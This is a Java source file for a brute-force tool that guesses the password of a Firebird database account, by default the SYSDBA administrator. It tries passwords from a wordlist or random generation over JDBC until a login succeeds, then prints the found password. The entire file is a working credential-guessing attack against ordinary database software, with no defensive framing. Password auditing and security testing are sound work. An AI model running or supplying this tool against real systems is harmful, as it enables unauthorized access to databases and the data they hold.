package firebird_brute;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Properties;
import java.util.Random;

public class FirebirdBrute {

    static String host = "localhost:employee";
    static String brute_user = "SYSDBA";
    static String pass_file = "/password/top500.txt";
    static Date date_start = new Date();
    static Date date_finish = new Date();

    /*Random password config: 
    - use of different registers of letters in the password;
    - minimum number of digits in the password;
    - minimum number of letters in the password;
    - minimum length of the password;
    - maximum length of the password;
     */
    static boolean diff_case = true;
    static int min_need_dig = 1;
    static int min_need_char = 1;
    static int minLen = 1;
    static int maxLen = 8;

    public static void main(String[] args) throws ClassNotFoundException,
            SQLException, FileNotFoundException, InterruptedException, IOException {

        read_properties();
        if (pass_file.contains("random")) {
            try {
                System.out.println("Trying to connect with DB: " + host + "\n"
                        + "User: " + brute_user + "\n"
                        + "Start time: " + date_start.toString() + "\n");
                while (true) {
                    System.out.println("Press Enter key to STOP!");
                    authdb(passwordGen());
                    if (System.in.available() != 0) {
                        date_finish = new Date();
                        System.out.println("Valid password not search." + "\n"
                        + "Finish time: " + date_finish.toString() + "\n"
                        + getTotalTime());
                        break;
                    }
                }
            } catch (IOException ex) {
                System.out.println("Error running: " + ex);
            }
        } else {
            FileInputStream fstream = new FileInputStream(pass_file);
            BufferedReader br = new BufferedReader(new InputStreamReader(fstream));
            String strLine;
            try {
                System.out.println("Trying to connect with DB: " + host + "\n"
                        + "User: " + brute_user + "\n"
                        + "Start time: " + date_start.toString() + "\n");
                while ((strLine = br.readLine()) != null) {
                    authdb(strLine);
                }
                date_finish = new Date();
                System.out.println("This dictionary does not contain a valid password."
                        + "\n" + "Finish time: " + date_finish.toString() + "\n" 
                            + getTotalTime());
            } catch (IOException ex) {
                System.out.println("Error running: " + ex);
            }
        }
    }

    private static void read_properties() throws IOException {
        FileInputStream fis = null;
        Properties property = new Properties();
        try {
            fis = new FileInputStream("config.properties");
            if (fis != null) {
                property.load(fis);
            } else {
                throw new FileNotFoundException("Error! Property file config.properties not found");
            }
            brute_user = property.getProperty("db.login");
            host = property.getProperty("db.host") + ":" + property.getProperty("db.name");

            pass_file = property.getProperty("brute.file");
            if (pass_file.contains("random")) {
                diff_case = property.getProperty("diff_case").contains("yes");
                min_need_dig = Integer.valueOf(property.getProperty("min_need_dig"));
                min_need_char = Integer.valueOf(property.getProperty("min_need_char"));
                minLen = Integer.valueOf(property.getProperty("minLen"));
                maxLen = Integer.valueOf(property.getProperty("maxLen"));
            }

        } catch (Exception e) {
            System.out.println("Exception: " + e);
        } finally {
            fis.close();
        }
    }

    private static void authdb(String pass) throws ClassNotFoundException {

        try {
            Class.forName("org.firebirdsql.jdbc.FBDriver");
            Connection conn = DriverManager.getConnection("jdbc:firebirdsql:" + host,
                    brute_user, pass);
            try {
                Statement stmt = conn.createStatement();
                try {
                    date_finish = new Date();
                    System.out.println("Password: " + pass + " - correct! \n"
                            + "Finish time: " + date_finish.toString() + "\n"
                            + getTotalTime());
                    System.exit(0);
                } finally {
                    stmt.close();
                }
                stmt.close();
                conn.close();
            } catch (SQLException ex) {
                System.out.println("SQL Error: " + ex);
            }
        } catch (SQLException ex) {
            System.out.println("Password: " + pass + " - invalid");
        }
    }

    private static String getTotalTime() {
        long diff = date_finish.getTime() - date_start.getTime();
        long diffSeconds = diff / 1000 % 60;
        long diffMinutes = diff / (60 * 1000) % 60;
        long diffHours = diff / (60 * 60 * 1000) % 24;
        long diffDays = diff / (24 * 60 * 60 * 1000);
        String s = "Total time: " + diffDays + " days, "
                + diffHours + " hours, " + diffMinutes + " minutes, "
                + diffSeconds + " seconds.";
        return s;
    }

    private static String passwordGen() {
        boolean lwrCh = false;
        boolean uppCh = false;

        Random rd = new Random();
        char lowerChars[] = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        char upperChars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
        char fullChars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".toCharArray();
        char numbers[] = "0123456789".toCharArray();
        char symbols[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$&".toCharArray();
        //char specialChars[] = "!@#$&".toCharArray();

        List<Character> pwdLst = new ArrayList<Character>();
        if (minLen > maxLen) {
            System.out.println("Minimum length cannot be greater than the maximum");
            System.exit(0);
        }
        if ((min_need_char + min_need_dig) > minLen) {
            System.out.println("Minimum length should be atleast sum of (min_need_char + min_need_dig) Length!");
            System.exit(0);
        }
        if ((min_need_char < 2) & diff_case) {
            System.out.println("For use different registers require a minimum of 2 letters");
            System.exit(0);
        }
        
        int len_pass = rd.nextInt(maxLen - minLen + 1) + minLen;
        char[] pswd = new char[len_pass];
        int index = 0;

        for (int k = 0; k < min_need_dig; k++) {
            pwdLst.add(numbers[rd.nextInt(10)]);
            len_pass--;
        }
        for (int l = 0; l < min_need_char; l++) {
            Integer ird = rd.nextInt(52);
            if (ird <= 25) {
                uppCh = true;
            } else {
                lwrCh = true;
            }
            pwdLst.add(fullChars[ird]);
            len_pass--;
        }
        for (int i = 0; i < len_pass; i++) {
            if (diff_case & !lwrCh) {
                pwdLst.add(lowerChars[rd.nextInt(26)]);
                lwrCh = true;
            }
            else if (diff_case & !uppCh) {
                pwdLst.add(upperChars[rd.nextInt(26)]);
                uppCh = true;
            }
            else pwdLst.add(symbols[rd.nextInt(67)]);
        }
        StringBuilder password = new StringBuilder();
        Collections.shuffle(pwdLst);
        for (int c = 0; c < pwdLst.size(); c++) {
            password.append(pwdLst.get(c));
        }
        return password.toString();
    }

}
